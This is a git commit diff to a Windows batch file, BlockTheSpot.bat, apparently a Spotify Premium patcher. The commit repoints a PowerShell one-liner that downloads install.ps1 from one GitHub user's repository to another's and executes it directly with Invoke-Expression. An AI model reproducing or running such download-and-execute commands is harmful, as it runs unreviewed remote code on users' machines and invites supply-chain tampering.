873594c9f85bbcde874ef14457c85776defa86f7
Senko <168974264+senko-bin@users.noreply.github.com>
2024-06-14 23:34:46 +0200

    Add files via upload

--- BlockTheSpot.bat
+++ BlockTheSpot.bat
@@ -1,4 +1,4 @@
 @echo off
-powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/Kreyto1/Spotify_Premium/main/install.ps1' | Invoke-Expression}"
+powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/senko-bin/Spotify_Premium/main/install.ps1' | Invoke-Expression}"
 pause
 exit /b
